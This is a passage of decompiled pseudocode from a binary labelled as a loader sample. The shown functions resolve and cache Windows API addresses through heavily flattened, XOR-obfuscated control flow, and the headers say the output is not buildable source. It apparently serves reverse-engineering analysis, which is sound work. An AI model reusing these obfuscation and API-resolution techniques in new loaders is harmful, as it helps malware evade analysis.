            pvVar17 = *(LPVOID *)(puVar11 + 0x48);
            *(byte *)((longlong)pvVar17 + lVar8) = (byte)(uVar13 >> 0x26) | 0xc0;
            *(byte *)((longlong)pvVar17 + lVar8 + 1) = bVar5 & 0x3f | 0x80;
          }
          else {
            *(undefined8 *)(puVar11 + -8) = 0x1400040ce;
            FUN_1400125b9((undefined8 *)(puVar11 + 0x48),4 - (ulonglong)(uVar13 < 0x1000000000000));
            bVar18 = bVar5 & 0x3f | 0x80;
            bVar5 = (byte)(uVar13 >> 0x26) & 0x3f | 0x80;
            pvVar17 = *(LPVOID *)(puVar11 + 0x48);
            bVar9 = (byte)(uVar13 >> 0x2c);
            if (uVar13 < 0x1000000000000) {
              *(byte *)((longlong)pvVar17 + lVar8) = bVar9 | 0xe0;
              *(byte *)((longlong)pvVar17 + lVar8 + 1) = bVar5;
              *(byte *)((longlong)pvVar17 + lVar8 + 2) = bVar18;
              lVar12 = 3;
            }
            else {
              *(byte *)((longlong)pvVar17 + lVar8) = (byte)(uVar13 >> 0x32) | 0xf0;
              *(byte *)((longlong)pvVar17 + lVar8 + 1) = bVar9 & 0x3f | 0x80;
              *(byte *)((longlong)pvVar17 + lVar8 + 2) = bVar5;
              *(byte *)((longlong)pvVar17 + lVar8 + 3) = bVar18;
              lVar12 = 4;
            }
          }
          lVar8 = lVar8 + lVar12;
        } while( true );
      }
    }
                    /* WARNING: Does not return */
    pcVar4 = (code *)invalidInstructionException();
    (*pcVar4)();
  }
  *(undefined8 *)(puVar11 + -8) = 0x140003fa0;
  DVar6 = GetLastError();
  *(DWORD *)(puVar11 + 0x70) = DVar6;
  *(code **)(puVar11 + 0x48) = FUN_14000fcae;
  *(undefined1 **)(puVar11 + 0x50) = puVar11 + 0x40;
  *(code **)(puVar11 + 0x58) = FUN_14000fcae;
  *(undefined1 **)(puVar11 + 0x60) = puVar11 + 0x70;
  uVar10 = *(undefined8 *)(param_2 + 0x10);
  lVar8 = *(longlong *)(param_2 + 0x18);
  puVar15 = (ushort *)0x14008a386;
LAB_140004234:
  *(undefined8 *)(puVar11 + -8) = 0x140004239;
  uVar13 = FUN_140010a2f(uVar10,lVar8,(ulonglong)(puVar11 + 0x48),puVar15);
  return uVar13 & 0xffffffff;
joined_r0x00014000419e:
  if (lVar8 == 0) {
    lVar8 = 0;
LAB_1400041c3:
    uVar10 = *(undefined8 *)(*(longlong *)(puVar11 + 0x68) + 0x10);
    pcVar4 = *(code **)(*(longlong *)(*(longlong *)(puVar11 + 0x68) + 0x18) + 0x18);
    *(undefined8 *)(puVar11 + -8) = 0x1400041d4;
    uVar7 = (*pcVar4)(uVar10,pvVar17,lVar8);
    *(undefined8 *)(puVar11 + -8) = 0x1400041ed;
    FUN_140001280(pvVar17,lVar12,1,1);
    return (ulonglong)uVar7;
  }
  uVar13 = (ulonglong)*(byte *)((longlong)pvVar17 + lVar8 + -1);
  if ((0x20 < uVar13) || ((0x100003600U >> (uVar13 & 0x3f) & 1) == 0)) goto LAB_1400041c3;
  lVar8 = lVar8 + -1;
  goto joined_r0x00014000419e;
LAB_1400041ef:
  *(undefined8 *)(puVar11 + -8) = 0x140004208;
  FUN_140001280(pvVar17,*(longlong *)(puVar11 + 0x50),1,1);
LAB_140004208:
  *(code **)(puVar11 + 0x48) = FUN_14000fcae;
  *(undefined1 **)(puVar11 + 0x50) = puVar11 + 0x40;
  uVar10 = *(undefined8 *)(*(longlong *)(puVar11 + 0x68) + 0x10);
  lVar8 = *(longlong *)(*(longlong *)(puVar11 + 0x68) + 0x18);
  puVar15 = (ushort *)0x1400891a4;
  goto LAB_140004234;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x4251 | verified_conservative_local_CFG_only ===== */
/* NORMAL INITIALIZATION CONTEXT ONLY. Original-byte conservative local CFG with statically derived loader TLS. Local computed-JMP targets are finite; PE-bound import tails and CFG guard dispatch are represented as tail calls. Unknown callee/store effects remain havoc. Actual indirect CALL targets and transitive behavior require separate evidence. Not original source, not a buildable project. Original instruction bytes unchanged. */

/* WARNING: Type propagation algorithm not settling */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

HMODULE FUN_140004251(uint param_1,HMODULE param_2,HMODULE param_3,ulonglong param_4)

{
  ushort *puVar1;
  ushort uVar2;
  ulonglong uVar3;
  code *pcVar4;
  byte bVar5;
  ulonglong uVar6;
  HMODULE pHVar7;
  uint *puVar8;
  uint *puVar9;
  HWND hwnd;
  HMONITOR hMonitor;
  longlong lVar10;
  uint *puVar11;
  ulonglong uVar12;
  uint uVar13;
  uint *puVar14;
  int iVar15;
  uint uVar16;
  uint **ppuVar17;
  ulonglong uVar18;
  char cVar19;
  uint uVar20;
  uint uVar21;
  bool bVar22;
  ulonglong local_f8;
  ulonglong local_e8;
  uint local_d4;
  undefined8 local_c8;
  uint *local_b8;
  uint *local_90;
  undefined8 local_88;
  uint **local_80;
  ulonglong local_78;
  ulonglong local_70;
  tagMONITORINFO local_68;
  
  FUN_140011d10();
  uVar3 = *(ulonglong *)
           (*(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8) + 0xb8);
  LOCK();
  bVar22 = DAT_1400e06d8 == '\0';
  if (bVar22) {
    DAT_1400e06d8 = '\x01';
  }
  UNLOCK();
  lVar10 = 8;
  if (bVar22) {
    lVar10 = 0x20;
  }
  uVar13 = (uint)uVar3;
                    /* WARNING: Switch is manually overridden */
  switch(*(undefined4 *)((longlong)&switchD_1400042d6::switchdataD_14008b0d8 + lVar10)) {
  case 0:
    do {
      lVar10 = 0x14;
      if (DAT_1400e06d8 == (char)('_' - (char)uVar3)) {
        lVar10 = 0x9c;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*(undefined4 *)((longlong)&switchD_1400042d6::switchdataD_14008b0d8 + lVar10)) {
      case 0xfffffd54:
        do {
        } while ((char)('_' - (char)uVar3) != DAT_1400e06d8);
      }
      LOCK();
      bVar22 = DAT_1400e06d8 == '\0';
      if (bVar22) {
        DAT_1400e06d8 = '\x01';
      }
      UNLOCK();
      puVar11 = &switchD_1400042d6::switchdataD_14008b0e0;
      if (bVar22) {
        puVar11 = &switchD_1400042d6::switchdataD_14008b0f8;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*puVar11) {
      case 0xfffffa3e:
        goto switchD_1400042d6_caseD_20;
      }
    } while( true );
  case 0xfffffa3e:
switchD_1400042d6_caseD_20:
    puVar11 = &UINT_14008b11c;
    if (DAT_1400e06d0 == (uint *)0x0) {
      puVar11 = &switchD_140004baf::switchdataD_14008b158;
    }
  }
                    /* WARNING: Switch is manually overridden */
  switch(*puVar11) {
  case 0xfffff54e:
switchD_1400050cf_caseD_80:
    FUN_140013125();
    pHVar7 = (HMODULE)GetProcAddress(param_2,(LPCSTR)param_3);
                    /* WARNING: Switch is manually overridden */
    switch(pHVar7 != (HMODULE)0x0) {
    case false:
      return (HMODULE)0x0;
    }
    LOCK();
    bVar22 = DAT_1400e06d8 == '\0';
    if (bVar22) {
      DAT_1400e06d8 = '\x01';
    }
    UNLOCK();
    puVar11 = &UINT_14008b0e4;
    if (bVar22) {
      puVar11 = &UINT_14008b184;
    }
    break;
  case 0xfffffb17:
    local_e8 = uVar3 & 0xffffffff ^ 0x5f7c5a5f;
    uVar12 = DAT_1400e06c8;
    puVar11 = DAT_1400e06d0;
    do {
      uVar6 = (ulonglong)*(ushort *)((longlong)puVar11 + (ulonglong)(uVar13 ^ 0x5f7c5ac7));
      puVar14 = (uint *)((uVar13 ^ 0x5f7c5a5b) * uVar6 + (longlong)puVar11);
      puVar8 = &UINT_14008b0dc;
      if (puVar11 != puVar14) {
        puVar8 = &switchD_140004baf::switchdataD_14008b190;
      }
      uVar18 = 0xffffffffffffffff;
      puVar9 = puVar11;
                    /* WARNING: Switch is manually overridden */
      switch(*puVar8) {
      case 0x27:
        do {
          uVar21 = *puVar9;
          uVar18 = uVar18 + 1;
          if ((char)((uVar21 < param_1) - (param_1 < uVar21)) != '\x01') {
            if (uVar21 < param_1 == param_1 < uVar21) {
              pHVar7 = *(HMODULE *)(puVar11 + uVar18 * 2 + 0xc);
                    /* WARNING: Switch is manually overridden */
              goto LAB_14000451c;
            }
            uVar6 = uVar18;
                    /* WARNING: Switch is manually overridden */
            switch(uVar12 == local_e8) {
            case false:
              goto switchD_1400050cf_caseD_7c;
            }
            goto switchD_1400050cf_caseD_80;
          }
          puVar9 = (uint *)((longlong)puVar9 + (ulonglong)(0x5f7c5a63 - uVar13));
          puVar8 = &switchD_140004baf::switchdataD_14008b190;
          if (puVar9 == puVar14) {
            puVar8 = &UINT_14008b0dc;
          }
                    /* WARNING: Switch is manually overridden */
          switch(*puVar8) {
          case 0xfffffd3a:
            goto switchD_1400050cf_caseD_4;
          }
        } while( true );
      }
switchD_1400050cf_caseD_4:
                    /* WARNING: Switch is manually overridden */
      switch(uVar12 == local_e8) {
      case false:
switchD_1400050cf_caseD_7c:
        uVar12 = uVar12 - 1;
        puVar11 = *(uint **)((longlong)puVar11 + uVar6 * 8 + (ulonglong)(uVar13 + 0xa083a641));
        break;
      case true:
        goto switchD_1400050cf_caseD_80;
      }
    } while( true );
  }
                    /* WARNING: Switch is manually overridden */
  switch(*puVar11) {
  case 0xfffffa8c:
    do {
                    /* WARNING: Switch is manually overridden */
      switch(DAT_1400e06d8 != '\0') {
      case true:
code_r0x0001400043f0:
                    /* WARNING: Switch is manually overridden */
        switch(DAT_1400e06d8 != '\0') {
        case true:
          goto code_r0x0001400043f0;
        }
      }
      LOCK();
      bVar22 = DAT_1400e06d8 == '\0';
      if (bVar22) {
        DAT_1400e06d8 = '\x01';
      }
      UNLOCK();
      lVar10 = 0xc;
      if (bVar22) {
        lVar10 = 0xac;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*(undefined4 *)((longlong)&switchD_1400042d6::switchdataD_14008b0d8 + lVar10)) {
      case 0xfffffa22:
        goto switchD_140004876_caseD_ac;
      }
    } while( true );
  }
switchD_140004876_caseD_ac:
                    /* WARNING: Switch is manually overridden */
  switch(DAT_1400e06d0 == (uint *)0x0) {
  case false:
    uVar12 = (ulonglong)(ushort)DAT_1400e06d0[0x26];
    lVar10 = (uVar13 + 0xa083a5a5) * uVar12;
    puVar11 = &switchD_140004baf::switchdataD_14008b178;
    if (lVar10 == 0) {
      puVar11 = &UINT_14008b16c;
    }
    local_f8 = 0xffffffffffffffff;
    uVar6 = DAT_1400e06c8;
    puVar8 = DAT_1400e06d0;
                    /* WARNING: Switch is manually overridden */
    switch(*puVar11) {
    case 0xfffff47c:
      goto switchD_140004876_caseD_a0;
    }
switchD_1400050cf_caseD_94:
    local_f8 = uVar12;
                    /* WARNING: Switch is manually overridden */
    switch(uVar6 == 0) {
    case false:
      do {
        uVar6 = uVar6 - 1;
        puVar8 = *(uint **)(puVar8 + local_f8 * 2 + 0x28);
        uVar12 = (ulonglong)(ushort)puVar8[0x26];
        lVar10 = (uVar13 + 0xa083a5a5) * uVar12;
        puVar11 = &switchD_140004baf::switchdataD_14008b178;
        if (lVar10 == 0) {
          puVar11 = &UINT_14008b16c;
        }
        local_f8 = 0xffffffffffffffff;
                    /* WARNING: Switch is manually overridden */
        switch(*puVar11) {
        case 0xfffff328:
          goto switchD_1400050cf_caseD_94;
        case 0xfffff47c:
switchD_140004876_caseD_a0:
          while( true ) {
            uVar21 = puVar8[local_f8 + 1];
            local_f8 = local_f8 + 1;
            if ((char)((uVar21 < param_1) - (param_1 < uVar21)) != '\x01') break;
            lVar10 = lVar10 + -4;
            puVar11 = &switchD_140004baf::switchdataD_14008b178;
            if (lVar10 == 0) {
              puVar11 = &UINT_14008b16c;
            }
                    /* WARNING: Switch is manually overridden */
            switch(*puVar11) {
            case 0xfffff328:
              goto switchD_1400050cf_caseD_94;
            }
          }
          if (uVar21 < param_1 == param_1 < uVar21) {
            *(HMODULE *)(puVar8 + local_f8 * 2 + 0xc) = pHVar7;
            goto LAB_14000451c;
          }
                    /* WARNING: Switch is manually overridden */
          switch(uVar6 == 0) {
          case true:
            goto switchD_1400050cf_caseD_68;
          }
        }
      } while( true );
    case true:
switchD_1400050cf_caseD_68:
      lVar10 = 0x58;
      if (puVar8 == (uint *)0x0) {
        lVar10 = 0x28;
      }
    }
                    /* WARNING: Switch is manually overridden */
    switch(*(undefined4 *)((longlong)&switchD_1400042d6::switchdataD_14008b0d8 + lVar10)) {
    case 0xffffff42:
      puVar1 = (ushort *)((longlong)puVar8 + (ulonglong)(uVar13 ^ 0x5f7c5ac7));
      uVar2 = *(ushort *)((longlong)puVar8 + (ulonglong)(uVar13 ^ 0x5f7c5ac7));
      puVar11 = &UINT_14008b0f4;
      if (uVar2 < 0xb) {
        puVar11 = &UINT_14008b14c;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*puVar11) {
      case 0xfffffa62:
        uVar3 = local_f8 + 1;
                    /* WARNING: Switch is manually overridden */
        switch(-(uint)(uVar2 < uVar3)) {
        case 0:
          uVar21 = -uVar13 + 0x5f7c5a63;
          lVar10 = uVar2 - local_f8;
          FUN_140021f30((undefined8 *)(puVar8 + uVar3),
                        (undefined8 *)(uVar21 * local_f8 + (longlong)puVar8),
                        lVar10 << (6U - (char)uVar21 & 0x3f));
          puVar8[local_f8] = param_1;
          FUN_140021f30((undefined8 *)(puVar8 + uVar3 * 2 + 0xc),
                        (undefined8 *)((longlong)puVar8 + (-uVar13 + 0x5f7c5a67) * local_f8 + 0x30),
                        lVar10 * 8);
          *(HMODULE *)((longlong)puVar8 + (0x5f7c5a67 - uVar13) * local_f8 + 0x30) = pHVar7;
          *puVar1 = uVar2 + 1;
                    /* WARNING: Switch is manually overridden */
          break;
        case 0xffffffff:
          puVar8[local_f8] = param_1;
          *(HMODULE *)((longlong)puVar8 + (0x5f7c5a67 - uVar13) * local_f8 + 0x30) = pHVar7;
          *puVar1 = uVar2 + 1;
                    /* WARNING: Switch is manually overridden */
        }
        break;
      case 0xfffffbf4:
        lVar10 = 0x6c;
        if (local_f8 < (uVar13 ^ 0x5f7c5a5a)) {
          lVar10 = 0x60;
        }
                    /* WARNING: Switch is manually overridden */
        switch(*(undefined4 *)((longlong)&switchD_1400042d6::switchdataD_14008b0d8 + lVar10)) {
        case 0x11d:
          if (local_f8 == 5) {
            bVar22 = false;
            local_b8 = FUN_14000fc7a(0,0xa0);
            puVar11 = &switchD_140004680::switchdataD_14008b128;
            if (local_b8 != (uint *)0x0) {
              puVar11 = &switchD_1400042d6::switchdataD_14008b0d8;
            }
            uVar12 = 5;
                    /* WARNING: Switch is manually overridden */
            switch(*puVar11) {
            case 0xe7:
              goto switchD_1400050cf_caseD_50;
            }
          }
          else if (local_f8 == 6) {
            bVar22 = true;
            uVar12 = 5;
            local_f8 = 0;
            local_b8 = FUN_14000fc7a(0,0xa0);
            puVar11 = &switchD_140004680::switchdataD_14008b128;
            if (local_b8 != (uint *)0x0) {
              puVar11 = &switchD_1400042d6::switchdataD_14008b0d8;
            }
                    /* WARNING: Switch is manually overridden */
            switch(*puVar11) {
            case 0xe7:
              goto switchD_1400050cf_caseD_50;
            }
          }
          else {
            if (((int)DAT_1400df6c0 == 0x232dbf13) && (hwnd = GetDesktopWindow(), hwnd != (HWND)0x0)
               ) {
              GetSystemMetrics(0xd);
              GetDpiForWindow(hwnd);
              hMonitor = MonitorFromWindow(hwnd,1);
              if (hMonitor != (HMONITOR)0x0) {
                local_68.cbSize = 0x28;
                GetMonitorInfoW(hMonitor,&local_68);
                GetDpiForSystem();
              }
            }
            local_f8 = (uVar3 ^ 0xdf0dc18a083a5a6) + local_f8;
            bVar22 = true;
            uVar12 = 6;
            local_b8 = FUN_14000fc7a(0,0xa0);
            puVar11 = &switchD_140004680::switchdataD_14008b128;
            if (local_b8 != (uint *)0x0) {
              puVar11 = &switchD_1400042d6::switchdataD_14008b0d8;
            }
                    /* WARNING: Switch is manually overridden */
            switch(*puVar11) {
            case 0xe7:
switchD_1400050cf_caseD_50:
                    /* WARNING: Does not return */
              pcVar4 = (code *)invalidInstructionException();
              (*pcVar4)();
            }
          }
          break;
        case 0xfffff582:
          uVar12 = 4;
          bVar22 = false;
          local_b8 = FUN_14000fc7a(0,0xa0);
          puVar11 = &switchD_140004680::switchdataD_14008b128;
          if (local_b8 != (uint *)0x0) {
            puVar11 = &switchD_1400042d6::switchdataD_14008b0d8;
          }
                    /* WARNING: Switch is manually overridden */
          switch(*puVar11) {
          case 0xe7:
            goto switchD_1400050cf_caseD_50;
          }
        }
        cVar19 = (char)(uVar13 ^ 0x5f7c5a5a);
        bVar5 = -(*(char *)(*(longlong *)
                             ((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8) +
                           0x5c) * cVar19) * cVar19 - cVar19;
        *(undefined8 *)((longlong)local_b8 + (ulonglong)bVar5) = 0;
        uVar6 = ~uVar12 + (ulonglong)*puVar1;
        *(short *)(local_b8 + 0x26) = (short)uVar6;
                    /* WARNING: Switch is manually overridden */
        switch(uVar6 < (bVar5 ^ 0x9c)) {
        case false:
                    /* WARNING: Does not return */
          pcVar4 = (code *)invalidInstructionException();
          (*pcVar4)();
        }
        local_c8 = *(undefined8 *)(puVar8 + uVar12 * 2 + 0xc);
        local_d4 = (puVar8 + uVar12 + 1)[-1];
        FUN_140021f30((undefined8 *)local_b8,(undefined8 *)(puVar8 + uVar12 + 1),uVar6 * 4);
        FUN_140021f30((undefined8 *)(local_b8 + 0xc),(undefined8 *)(puVar8 + uVar12 * 2 + 0xe),
                      uVar6 * 8);
        *puVar1 = (ushort)uVar12;
        puVar11 = local_b8;
        if (!bVar22) {
          puVar11 = puVar8;
        }
        uVar2 = (ushort)puVar11[0x26];
        uVar12 = local_f8 + 1;
                    /* WARNING: Switch is manually overridden */
        switch(-(uint)(uVar2 < uVar12)) {
        case 0:
          lVar10 = uVar2 - local_f8;
          FUN_140021f30((undefined8 *)(puVar11 + uVar12),(undefined8 *)(puVar11 + local_f8),
                        lVar10 * 4);
          *(uint *)((longlong)puVar11 + (0x5f7c5a63 - uVar13) * local_f8) = param_1;
          FUN_140021f30((undefined8 *)
                        ((longlong)puVar11 + (0x5f7c5a63 - uVar13 ^ 0xc) * uVar12 + 0x30),
                        (undefined8 *)(puVar11 + local_f8 * 2 + 0xc),lVar10 * 8);
          *(HMODULE *)(puVar11 + local_f8 * 2 + 0xc) = pHVar7;
          *(ushort *)(puVar11 + 0x26) = uVar2 + 1;
          puVar11 = &UINT_14008b17c;
          if (*(uint **)(puVar8 + 0x24) == (uint *)0x0) {
            puVar11 = &UINT_14008b194;
          }
          uVar12 = 0;
          puVar14 = *(uint **)(puVar8 + 0x24);
                    /* WARNING: Switch is manually overridden */
          switch(*puVar11) {
          case 0xfffffac7:
            goto switchD_140004876_caseD_a4;
          }
          break;
        case 0xffffffff:
          puVar11[local_f8] = param_1;
          *(HMODULE *)(puVar11 + local_f8 * 2 + 0xc) = pHVar7;
          *(ushort *)(puVar11 + 0x26) = uVar2 + 1;
          puVar11 = &UINT_14008b17c;
          if (*(uint **)(puVar8 + 0x24) == (uint *)0x0) {
            puVar11 = &UINT_14008b194;
          }
          uVar12 = 0;
          puVar14 = *(uint **)(puVar8 + 0x24);
                    /* WARNING: Switch is manually overridden */
          switch(*puVar11) {
          case 0xfffffac7:
switchD_140004876_caseD_a4:
            do {
              uVar2 = *(ushort *)((longlong)puVar8 + (ulonglong)(uVar13 + 0xa083a629));
              uVar6 = (ulonglong)uVar2;
              uVar18 = (ulonglong)(ushort)puVar14[0x26];
              lVar10 = 0x38;
              if ((ushort)puVar14[0x26] <
                  (ushort)~((short)DAT_1400df6b0 + (short)(uVar13 + 0xa083a629) * -2)) {
                lVar10 = 0x88;
              }
                    /* WARNING: Switch is manually overridden */
              switch(*(undefined4 *)((longlong)&switchD_1400042d6::switchdataD_14008b0d8 + lVar10))
              {
              case 0xfffff9f2:
                puVar11 = &switchD_140004baf::switchdataD_14008b168;
                if (uVar2 < (ushort)((short)uVar3 + 0xa5a6U)) {
                  puVar11 = &UINT_14008b12c;
                }
                local_70 = uVar18;
                    /* WARNING: Switch is manually overridden */
                switch(*puVar11) {
                case 0xfffff944:
                    /* WARNING: Switch is manually overridden */
                  switch(uVar2 < 6) {
                  case false:
                    if (uVar2 == 6) {
                      local_f8 = 5;
                      uVar6 = 0;
                      ppuVar17 = (uint **)&local_68;
                      puVar11 = FUN_14000fc7a(0,0x100);
                    /* WARNING: Switch is manually overridden */
                      switch(puVar11 == (uint *)0x0) {
                      case true:
                        goto switchD_1400050cf_caseD_78;
                      }
                    }
                    else {
LAB_140004d0c:
                      uVar6 = uVar6 - 7;
                      local_f8 = 6;
                      ppuVar17 = (uint **)&local_68;
                      puVar11 = FUN_14000fc7a(0,0x100);
                    /* WARNING: Switch is manually overridden */
                      switch(puVar11 == (uint *)0x0) {
                      case true:
                        goto switchD_1400050cf_caseD_78;
                      }
                    }
                    break;
                  case true:
                    if (uVar2 != 5) goto LAB_140004d0c;
                    local_f8 = 5;
                    ppuVar17 = &local_90;
                    uVar6 = 5;
                    puVar11 = FUN_14000fc7a(0,0x100);
                    /* WARNING: Switch is manually overridden */
                    switch(puVar11 == (uint *)0x0) {
                    case true:
                      goto switchD_1400050cf_caseD_78;
                    }
                  }
                  break;
                case 0xfffffbbe:
                  local_f8 = 4;
                  ppuVar17 = &local_90;
                  puVar11 = FUN_14000fc7a(0,0x100);
                    /* WARNING: Switch is manually overridden */
                  switch(puVar11 == (uint *)0x0) {
                  case true:
                    goto switchD_1400050cf_caseD_78;
                  }
                }
                *(undefined8 *)((longlong)puVar11 + (ulonglong)(0x5f7c5aef - uVar13)) = 0;
                *(undefined2 *)(puVar11 + 0x26) = 0;
                uVar18 = ~local_f8 + (ulonglong)(ushort)puVar14[0x26];
                *(short *)(puVar11 + 0x26) = (short)uVar18;
                local_80 = ppuVar17;
                local_78 = uVar6;
                    /* WARNING: Switch is manually overridden */
                switch(0xb < uVar18) {
                case false:
                  iVar15 = -uVar13;
                  uVar16 = iVar15 + 0x5f7c5a8f;
                  local_88 = *(undefined8 *)
                              ((longlong)puVar14 +
                              (iVar15 + 0x5f7c5a67) * local_f8 + (ulonglong)uVar16);
                  uVar21 = *(uint *)((longlong)puVar14 + (iVar15 + 0x5f7c5a63) * local_f8);
                  FUN_140021f30((undefined8 *)puVar11,(undefined8 *)(puVar14 + local_f8 + 1),
                                uVar18 << ((char)iVar15 + 0x61U & 0x3f));
                  FUN_140021f30((undefined8 *)((ulonglong)(0x60 - uVar16) + (longlong)puVar11),
                                (undefined8 *)
                                ((longlong)puVar14 +
                                (ulonglong)(uVar16 ^ 0x38) * (local_f8 + 1) + (ulonglong)uVar16),
                                uVar18 * 8);
                  *(short *)(puVar14 + 0x26) = (short)local_f8;
                  uVar2 = (ushort)puVar11[0x26];
                  uVar20 = (uint)uVar2;
                  puVar8 = &switchD_140004680::switchdataD_14008b150;
                  if (uVar2 < (ushort)((ushort)uVar16 ^ 0x3c)) {
                    puVar8 = &switchD_1400042d6::switchdataD_14008b0e8;
                  }
                  break;
                case true:
switchD_1400050cf_caseD_78:
                    /* WARNING: Does not return */
                  pcVar4 = (code *)invalidInstructionException();
                  (*pcVar4)();
                }
                    /* WARNING: Switch is manually overridden */
                switch(*puVar8) {
                case 0x25:
                  goto switchD_1400050cf_caseD_78;
                case 0xfffff35b:
                  iVar15 = (int)local_70 - (int)local_f8;
                    /* WARNING: Switch is manually overridden */
                  switch(iVar15 != uVar20 + 1) {
                  case true:
                    /* WARNING: Does not return */
                    pcVar4 = (code *)invalidInstructionException();
                    (*pcVar4)();
                  }
                  FUN_140021f30((undefined8 *)(puVar11 + 0x28),
                                (undefined8 *)(puVar14 + local_f8 * 2 + 0x2a),
                                (ulonglong)(uint)(iVar15 * 8));
                  uVar6 = 1;
                  lVar10 = *(longlong *)(puVar11 + 0x28);
                  *(uint **)(lVar10 + (ulonglong)(0x5f7c5aef - uVar13)) = puVar11;
                  *(undefined2 *)(lVar10 + 0x88) = 0;
                  puVar8 = &switchD_140004baf::switchdataD_14008b170;
                  if ((ulonglong)uVar20 != 0) {
                    puVar8 = &UINT_14008b18c;
                  }
                    /* WARNING: Switch is manually overridden */
                  switch(*puVar8) {
                  case 0xfffff739:
switchD_1400050cf_caseD_98:
                    uVar12 = uVar12 + 1;
                    local_90 = puVar14;
                    local_68._0_8_ = puVar11;
                    FUN_140012f7e(local_78,(longlong)*local_80,local_d4,local_c8,local_b8);
                    puVar9 = *(uint **)((longlong)puVar14 + (ulonglong)(uVar13 + 0xa083a631));
                    lVar10 = 0xa4;
                    if (puVar9 == (uint *)0x0) {
                      lVar10 = 0xbc;
                    }
                    break;
                  case 0xfffffddd:
                    do {
                      lVar10 = *(longlong *)(puVar11 + uVar6 * 2 + 0x28);
                      *(uint **)(lVar10 + (ulonglong)(0x5f7c5aef - uVar13)) = puVar11;
                      *(short *)(lVar10 + 0x88) = (short)uVar6;
                      puVar8 = &switchD_140004baf::switchdataD_14008b170;
                      if (uVar20 != uVar6) {
                        puVar8 = &UINT_14008b18c;
                      }
                      uVar6 = uVar6 + 1;
                    /* WARNING: Switch is manually overridden */
                      switch(*puVar8) {
                      case 0xfffff739:
                        goto switchD_1400050cf_caseD_98;
                      }
                    } while( true );
                  }
                }
                break;
              case 0xfffffda7:
                FUN_140012f7e(uVar6,(longlong)puVar14,local_d4,local_c8,local_b8);
                    /* WARNING: Switch is manually overridden */
                goto override_jmp_1400047e3_case_0;
              }
              local_c8 = local_88;
              puVar8 = puVar14;
              puVar14 = puVar9;
              local_d4 = uVar21;
              local_b8 = puVar11;
                    /* WARNING: Switch is manually overridden */
              switch(*(undefined4 *)((longlong)&switchD_1400042d6::switchdataD_14008b0d8 + lVar10))
              {
              case 0xfffffaa3:
                goto switchD_140004876_caseD_bc;
              }
            } while( true );
          }
        }
switchD_140004876_caseD_bc:
        puVar11 = DAT_1400e06d0;
        uVar3 = DAT_1400e06c8;
        puVar8 = &UINT_14008b0fc;
        if (DAT_1400e06d0 == (uint *)0x0) {
          puVar8 = &switchD_140004baf::switchdataD_14008b180;
        }
                    /* WARNING: Switch is manually overridden */
        switch(*puVar8) {
        case 0x5c:
                    /* WARNING: Does not return */
          pcVar4 = (code *)invalidInstructionException();
          (*pcVar4)();
        }
        puVar8 = FUN_14000fc7a(0,0x100);
                    /* WARNING: Switch is manually overridden */
        switch((puVar8 != (uint *)0x0) * '\x02') {
        case '\0':
                    /* WARNING: Does not return */
          pcVar4 = (code *)invalidInstructionException();
          (*pcVar4)();
        case '\x02':
          puVar8[0x24] = 0;
          puVar8[0x25] = 0;
          uVar21 = uVar13 ^ 0x5f7c5ac7;
          *(undefined2 *)((longlong)puVar8 + (ulonglong)uVar21) = 0;
          *(uint **)(puVar8 + 0x28) = puVar11;
          uVar6 = uVar3 + 1;
          uVar18 = (ulonglong)(uVar13 ^ 0x5f7c5a5f);
                    /* WARNING: Switch is manually overridden */
          switch(uVar6 == uVar18) {
          case true:
                    /* WARNING: Does not return */
            pcVar4 = (code *)invalidInstructionException();
            (*pcVar4)();
          }
          *(uint **)(puVar11 + 0x24) = puVar8;
          *(undefined2 *)(puVar11 + 0x22) = 0;
          DAT_1400e06c8 = uVar6;
          DAT_1400e06d0 = puVar8;
                    /* WARNING: Switch is manually overridden */
          switch(uVar12 == uVar3) {
          case false:
                    /* WARNING: Does not return */
            pcVar4 = (code *)invalidInstructionException();
            (*pcVar4)();
          case true:
            *(undefined2 *)((longlong)puVar8 + (ulonglong)uVar21) = 1;
            *puVar8 = local_d4;
            lVar10 = (~(uVar21 + uVar18 +
                       *(longlong *)
                        (*(longlong *)
                          ((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8) + 0x28))
                     ^ uVar18) * -0x61691763907361d;
            *(undefined8 *)((longlong)puVar8 + lVar10) = local_c8;
            *(uint **)(puVar8 + 0x2a) = local_b8;
            *(uint **)(local_b8 + 0x24) = puVar8;
            *(undefined2 *)((longlong)local_b8 + (ulonglong)(0xb8 - (int)lVar10)) = 1;
          }
        }
      }
      goto override_jmp_1400047e3_case_0;
    }
  }
  puVar11 = FUN_14000fc7a(0,0xa0);
                    /* WARNING: Switch is manually overridden */
  switch(puVar11 != (uint *)0x0) {
  case false:
                    /* WARNING: Does not return */
    pcVar4 = (code *)invalidInstructionException();
    (*pcVar4)();
  case true:
    *(undefined8 *)((longlong)puVar11 + (ulonglong)(uVar13 + 0xa083a631)) = 0;
    *(undefined2 *)(puVar11 + 0x26) = 0;
    DAT_1400e06c8 = 0;
    DAT_1400e06d0 = puVar11;
    *(undefined2 *)(puVar11 + 0x26) = 1;
    *puVar11 = param_1;
    *(HMODULE *)
     ((longlong)puVar11 +
     (ulonglong)
     (byte)(((*(byte *)(*(longlong *)
                         ((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8) + 0x5d) ^
             9) - (char)(uVar13 + 0xa083a631)) - 0x18)) = pHVar7;
  }
override_jmp_1400047e3_case_0:
  _DAT_1400e06c0 = _DAT_1400e06c0 + 1;
LAB_14000451c:
  FUN_140013125();
  return pHVar7;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x5286 | verified_conservative_local_CFG_only ===== */
/* NORMAL INITIALIZATION CONTEXT ONLY. Original-byte conservative local CFG with statically derived loader TLS. Local computed-JMP targets are finite; PE-bound import tails and CFG guard dispatch are represented as tail calls. Unknown callee/store effects remain havoc. Actual indirect CALL targets and transitive behavior require separate evidence. Not original source, not a buildable project. Original instruction bytes unchanged. */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_140005286(void)

{
  HMODULE pHVar1;
  LPVOID pvVar2;
  HMODULE pHVar3;
  undefined2 uVar4;
